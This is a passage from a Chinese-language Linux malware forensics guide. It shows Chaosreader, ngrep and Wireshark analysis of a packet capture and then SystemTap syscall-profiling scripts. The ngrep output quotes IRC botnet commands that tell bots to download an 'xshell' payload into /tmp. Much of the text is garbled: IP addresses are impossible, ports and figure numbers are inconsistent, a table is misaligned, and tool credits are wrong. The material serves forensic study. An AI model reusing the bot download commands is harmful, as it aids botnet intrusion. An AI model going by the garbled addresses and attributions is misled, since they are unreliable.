
> 104 在编写时，RUMINT 原生并不在 Linux 上运行；要在 Linux 分析系统上安装并运行它，必须安装 WINE (`http://www.winehq.org/`)。

![](img/aa19fd7b1fc75dc422144821b9c6657c_511_0.png)

在图 6.65 中，*Byte Frequency*（字节频率）视图为数字调查提供了协议活动和数据传输的高级视图——有助于识别数据网络流量模式。

跟踪网络轨迹证据与受害者系统产生的数字印象和溯源证据进行对比。这在分析从远程资源检索附加文件的模块化恶意代码时尤为重要。

- 在获取流量概述后，深入探测并提取与样本相关的流量，并在需要时回放流量会话。可以使用 Elasticsearch 完成此，`tcptrace` 和 `tcpflow` 也可以。
- 对于网络流量的回放，一个非常有用的工具是 Chaosreader，它是一个免费开源 Perl 工具，可以跟踪 TCP 和 UDP 会话，并从网络数据包捕获中获取应用数据。
- Chaosreader 还可以以“独立”模式运行，其中调用 `tcpdump` 或 `snoop`（如果主机上已安装）来创建日志文件并进行处理。

## 恶意样本分析

```
root@MalwareLab:home/malware# chaosreader -i suspicious-file.pcap
Chaosreader ver 0.94
Opening file, /home/malware/suspicious-file.pcap
Reading contents, 100% (688123/68123)
Reassembling packets, 100% (4086/4114)
Creating files...
Num Session(host: <host:port> Service
473 172.166.135:47898, 172.166.136:6667  ircd
757 172.166.135:47921, 172.166.136:6667  ircd
057 172.166.135:33304, 172.166.136:6667  ircd
771 172.166.135:47931, 172.166.136:6667  ircd
052 172.166.130:57156, 172.166.218:6667  ircd
830 172.166.131:37212, 172.166.130:6667  ircd
780 172.166.130:33008, 172.166.133:6667  http
688 172.166.130:48092, 172.166.133:6667  ircd
722 172.166.130:48123, 172.166.133:6667  ircd
025 172.166.130:51577, 140.247.60:80
011 172.166.130:36522, 172.166.130:39:80  http
447 172.166.135:47882, 172.166.133:6667  ircd
739 172.166.130:48138, 172.166.133:6667  ircd
065 172.166.130:57159, 204.218.102:6667  ircd
308 172.166.130:44779, 172.166.132:80  http
...
index.html created.
```

图 6.66-通过 Chaosreader 解析数据包捕获

- 要通过 Chaosreader 处理捕获文件，必须指向图 6.66 所示的目标文件。Chaosreader 读取文件并创建单独会话。
- 在解析数据时，Chaosreader 显示会话日志，包括会话名称、相应的网络节点和端口以及相应的的服务。
- 解析所有会话后，Chaosreader 生成一个 HTML 文件，链接到所有会话，包括 telnet、IRC、X11 和 VNC 会话。同样地，流量会话

Chaosreader 报告

File_name.file 关于捕获 tcpdump 的报告。创建于 Jul 18 19:37:35 2013

Image Report -查看 GET 和 POSTS 的报告。

GET Report（空）-查看 HTTP GET 和 POSTS 的报告。

POST Report -查看生成的报告。

TCP/UDP.../ Sessions:

| No | Date | Source | Protocol | Bytes In | Bytes Out | Session | Duration |
|---|---|---|---|---|---|---|---|
| 732 | Jul 18 19:36:05 2013 | 172.166.130.662 | 172.166.130.667 | tcp | 0 bytes | 0 bytes | session_0732.icrd | 0 seconds |
| 733 | Jul 18 19:36:05 2013 | 172.166.130.663 | 172.166.130.667 | tcp | 0 bytes | 0 bytes | session_0733.icrd | 0 seconds |
| 734 | Jul 18 19:36:05 2013 | 172.166.130.664 | 172.166.130.667 | tcp | 0 bytes | 0 bytes | session_0734.icrd | 0 seconds |
| 735 | Jul 18 19:36:05 2013 | 172.166.130.665 | 172.166.130.667 | tcp | 0 bytes | 0 bytes | session_0735.icrd | 0 seconds |
| 736 | Jul 18 19:36:05 2013 | 172.166.130.666 | 172.166.130.667 | tcp | 0 bytes | 0 bytes | session_0736.icrd | 0 seconds |
| 737 | Jul 18 19:36:05 2013 | 172.166.130.667 | 172.166.130.667 | tcp | 0 bytes | 0 bytes | session_0737.icrd | 0 seconds |
| 738 | Jul 18 19:36:05 2013 | 172.166.130.668 | 172.166.130.667 | tcp | 0 bytes | 0 bytes | session_0738.icrd | 0 seconds |
| 739 | Jul 18 19:36:05 2013 | 172.166.130.669 | 172.166.130.667 | tcp | 0 bytes | 0 bytes | session_0739.icrd | 0 seconds |
| 740 | Jul 18 19:36:05 2013 | 172.166.130.670 | 172.166.130.667 | tcp | 0 bytes | 0 bytes | session_0740.icrd | 0 seconds |
| 741 | Jul 18 19:36:05 2013 | 172.166.130.671 | 172.166.130.667 | tcp | 0 bytes | 4058 bytes | session_0741.icrd | 43 seconds |
| 742 | Jul 18 19:36:05 2013 | 172.166.130.672 | 172.166.130.667 | tcp | 0 bytes | 0 bytes | session_0742.icrd | 0 seconds |

## 第 6 章 | 恶意样本分析

```
malwarelab@malwarelab:~/home/malwarelab$ ngrep -I suspicious-file.pcap -q "xshell"
input: suspicious-file.pcap
匹配: xshell
```

```
T 172.16.130:36539 -> 172.16.133:66667 [AP]
PRMSG #botz !*S GET http://172.16.132/xshell /tmp/xshell...

T 172.16.133:66667 -> 172.16.130:58665 [AP]
!lab!-bot1@172.16.132 PRMSG #botz !*S GET http://172.16.132/xshell/xshell...

T 172.16.130:36539 -> 172.16.133:66667 [AP]
PRMSG #botz !*S GET http://172.16.132/xshell /tmp/xshell...

T 172.16.133:66667 -> 172.16.130:58665 [AP]
!lab!-bot1@172.16.132 PRMSG #botz !*S GET http://172.16.132/shell/xshell...

T 172.16.130:36539 -> 172.16.133:66667 [AP]
PRMSG #botz !*S GET http://172.16.132/xshell /tmp/xshell...

T 172.16.133:66667 -> 172.16.130:58665 [AP]
!lab!-bot1@172.16.132 PRMSG #botz !*S GET http://172.16.132/de11/xshell /tmp/xshell...

T 172.16.133:66667 -> 172.16.130:33062 [AP]
!lab!-bot1@172.16.132 PRMSG #botz !*S GET http://172.16.17130/apache2-default/xshell /tmp/xshell...

T 172.16.133:66667 -> 172.16.130:48139 [AP]
!lab!-bot1@172.16.132 PRMSG #botz !*S GET http://172.16.17130/apache2-default/xshell /tmp/xshell...

T 172.16.133:66667 -> 172.16.130:48138 [AP]
!lab!-bot1@172.16.132 PRMSG #botz !*S GET http://172.16.17130/apache2-default/xshell /tmp/xshell...

T 172.16.133:66667 -> 172.16.130:48139 [AP]
!lab!-bot1@172.16.132 PRMSG #botz !*S GET http://172.16.16130/apache2-default/xshell /tmp/xshell...

T 172.16.133:66667 -> 172.16.130:48139 [AP]
!lab!-bot1@172.16.132 PRMSG #botz !*S GET http://172.16.16130/apache2-default/xshell /tmp/xshell...

T 172.16.130:48138 -> 172.16.133:33062 [AP]
!lab!-bot1@172.16.132 PRMSG #botz !*S GET http://172.16.16130/apache2-default/xshell /tmp/xshell...

T 172.16.130:48138 -> 172.16.133:6667 [AP]
NOTICE lab Saved as /tmp/xshell.
```

图 6-8-使用 ngrep 搜索网络追踪证据

# 490 Linux 系统恶意软件取证指南

```
172.16.160.37213 >> 172.16.160.80 [AP]
GET /xhtml HTTP/1.1
User-Agent: Opera/9.80 (X11; Linux) Presto/2.12.
Host: 172.16.160.13
Accept: text/html, application/xml, image/png, image/webp, image/gif
Accept-Language: en-US;q=0.9
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

172.16.160.37213 >> 172.16.160.80 [AP]
HTTP/1.1 404 Found
Date: Sun, 14 Jul 02:15:06 GMT
Server: Apache/2.2.3 (Ubuntu)
PHP/5.2.1
Content-Length: 292
Keep-Alive: timeout=15
Content-Type: text/html; charset=iso-8859-1
<!DOCTYPE HTML>
<html><head><title>404 Found</title></head>
<body>Requested URL /shell was not found on this server.<address>Apache/2.2.3 (Ubuntu)
PHP/5.2.1 Server at 80</address></body></html>

172.16.160.37213 >> 172.16.160.80 [AP]
GET /xhtml HTTP/1.1
User-Agent: Opera/9.80 (X11; Linux) Presto/2.12.3.
Host: 172.16.160.13
Accept: text/html, application/xml, image/png, image/webp, image/gif
Accept-Language: en-US;q=0.9
Accept-Encoding: gzip, deflate
Connection: Keep-Alive
```

`ngrep` 识别术语并显示与该术语相关的输出。可以使用 Wireshark 的“Find Packet”功能对数据包捕获进行字符串搜索（图 6.69）。

图 6-68—捕获

图 6-69—Wireshark Find Packet 功能

## 第 6 章 | 恶意样本分析

## 需要考虑的其他工具

噬 包捕获分析

- **`tcpdump`**: 由 Nick Harbour 编写

### 分析系统调用

另一个执行后重建任务是对嫌程序执行的系统调用进行集体审查，以及这些调用与分析或事件重建期间发现的其他遗迹之间的关系。SystemTap 等工具通过不同的捕获摘要提供了收集和分析系统调的方法，这是识别恶意样本在运行时调用的比例和类型的极佳概述。

要确定运行进程（在指定时间段内）系统调用总数以比较活动进程，可以使用这些脚本：

| 脚本 | 功能 | 来源 |
| :--- | :--- | :--- |
| `profile.stp` | 识别用户空间运行的进程以及相应的系统调用数量。脚本默认捕获 10 秒，但可以修改脚本中的计时器（图 6.70）。 | `http://www.ibm.com/developers/linux/library/systemtap/` |
| `syscalls_by_pid.stp` | 按 PID 计算系统调用。此脚本收集系统上的所有系统调用；退出时，从大到小列出每个 PID 执行的系统调用次数。 | `http://source.org/systemtap/examples/process/syscalls_by_pid.stp` |
| `syscalls_by_proc.stp` | 按进程/执行文件计算系统调用。此脚本捕获系统上的所有系统调用；退出时，从大到小列出每个进程/执行文件执行的系统调用次数。 | `http://source.org/systemtap/examples/process/syscalls_by_proc.stp` |
| `syscall-times` | 此组合/SystemTap 脚本用于测量系统调用次数和时间。脚本可以校准过滤 PID、进程名和用户。 | `http://source.org/systemtap/examples/process/syscalltimes` |
| `topsys.stp` | 每 5 秒间隔列出系统前 20 个系统调用（以及相应的调用次数）。 | `http://source.org/systemtap-Beginners_Guide/6/html/topsys#topsys` |
| `function-callcount.stp` | 揭示调用的函数名称以及采样时间内每个函数调用的次数（按字母顺序）。 | `https://access.redhat.com/site/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/systemtap_Beginners_Guide/mainsect-profiling.html` |

```
root@MalwareLab:/home/malwarelab$ stap profile.stp
系统调用监控 (10 秒)...
WARNING: 错误数量: 0, 跳过的探针: 1
gettimeofday = 42
poll = 21
sendto = 21
close = 28
socket = 23
connect = 18
open = 10
stat = 15
read = 10
munmap = 5
```

> 图 6.70—显示进程执行的系统调用数量的 SystemTap 脚本

## 第 6 章 | 恶意样本分析

在确定目标进程执行的系统调用数量后，使用额外的脚本进行分层分析以揭示并总结系统调用，如图 6.71 所示。对于此脚本，添加了恶意软件的进程名 `sysfile`，并将探针时间修改为 20 秒（默认为 10 秒）。
